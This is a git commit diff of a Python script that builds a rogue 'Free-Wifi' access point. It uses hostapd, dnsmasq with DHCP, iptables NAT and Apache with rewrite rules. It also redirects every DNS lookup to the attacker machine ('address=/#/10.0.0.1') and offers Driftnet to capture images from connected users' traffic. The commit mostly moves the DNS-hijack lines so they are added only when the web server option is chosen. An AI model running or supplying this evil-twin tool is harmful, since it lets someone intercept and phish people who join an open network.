3c83f8e810ae859757733206f6df8aacd64ff140
toballz <42551340+toballz@users.noreply.github.com>
2021-09-28 22:46:39 -0400

    Update a.py

--- a.py
+++ a.py
@@ -33,7 +33,6 @@ try:
   print("!done..")
   #...0
 
-
  ###################################################
  ###################################################
  os.system("sudo echo")
@@ -41,25 +40,9 @@ try:
  wlan_ap = input("[??] Input wireless adapter's name:(wlan0) ") or "wlan0"
  eth_ap = input("[??] Input internet access point name:(eth0) ") or "eth0"
 
- #..DNSMASQ CONFIG 1
- print("")
- print("[~~] Creating /dnsmasq.conf...")
- os.system("sudo service NetworkManager restart")
- os.system("sudo pkill dnsmasq")
- dnsmasq_txt = "#disable dnsmasq reading other files ~ /etc/resolv.conf for nameservers\nno-resolv\n\ninterface="+wlan_ap+"\n\n#starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\n\n#dns addresses to send to the clients\n\
- server=8.8.8.8\n\
- server=0.0.0.0\n\
- dhcp-option=3,10.0.0.1\n\
- dhcp-option=6,10.0.0.1\n\
- address=/#/10.0.0.1\n\
- no-hosts\n"
- write_file("/tmp/acp_dnsmasq.conf", dnsmasq_txt)
- #...0
-
  #..HOSTAPD CONFIG 1
- print("")
  ssid = input("[??] Input ssid name:(Free-Wifi) ") or "Free-Wifi"
- rnd = rand.randint(0, 9)
+ rnd = rand.randint(1, 9)
  channel = input("[??] Input channel number:("+str(rnd)+") ") or str(rnd)
 
  hostapd_txt = "interface=" + wlan_ap + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n"
@@ -69,7 +52,6 @@ try:
  #...0
 
  #..IPTABLES 1
- print("")
  print("[~~] Configuring AP interface...")
  os.system("sudo ifconfig " + wlan_ap + " up 10.0.0.1 netmask 255.255.255.0")
 
@@ -81,17 +63,17 @@ try:
  os.system("sudo iptables -t nat -A POSTROUTING -o "+eth_ap+" -j MASQUERADE")
  #...0
 
- ###########################
- ###########################
- #start dnsmasq hostapd 1
+
+ #..DNSMASQ CONFIG 3
  print("")
- print("[~~] Starting DNSMASQ server...")
+ print("[~~] Creating /dnsmasq.conf...")
+ os.system("sudo service NetworkManager restart")
  os.system("sudo pkill dnsmasq")
- os.system("sudo dnsmasq -C /tmp/acp_dnsmasq.conf")
- print("[~~] Starting HOSTAPD server...")
- print("")
- input("[!!] Press Enter to continue: ")
- ############# others 1
+ dnsmasq_txt = "#disable etc/resolv.conf\nno-resolv\n\ninterface="+wlan_ap+"\n\n#starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\n\n#dns addresses to send to the clients\nserver=8.8.8.8\nserver=0.0.0.0\nno-hosts\n"
+ #...2
+
+ ###########################
+ ###########################
  print("")
  ##Driftnet 1
  fiDriftnet = input("[!?] Use Driftnet (y/N): ")
@@ -114,14 +96,26 @@ try:
    	 	AllowOverride All\n\
    	 	Require all granted\n</Directory>\" >> /etc/apache2/sites-available/000-default.conf")
   os.system("sudo service apache2 start && sudo service apache2 restart && a2enmod rewrite > /dev/null 2>&1")
+  dnsmasq_txt += "dhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\n"
 ###################...0
+
+ #..DNSMASQ CONFIG 1
+ write_file("/tmp/acp_dnsmasq.conf", dnsmasq_txt)
+ print("[~~] Starting DNSMASQ server...")
+ os.system("sudo pkill dnsmasq")
+ os.system("sudo dnsmasq -C /tmp/acp_dnsmasq.conf")
  print("")
+ input("[!!] Press Enter to continue: ")
+ print("")
+ #start dnsmasq hostapd 1
+ print("[~~] Starting HOSTAPD server...")
  print("")
  os.system("sudo killall hostapd > /dev/null 2>&1")
  os.system("sudo hostapd /tmp/acp_hostapd.conf")
  #...0
 
  #end all
+ print("")
  flushIpTables()
  killSall()
  #...0
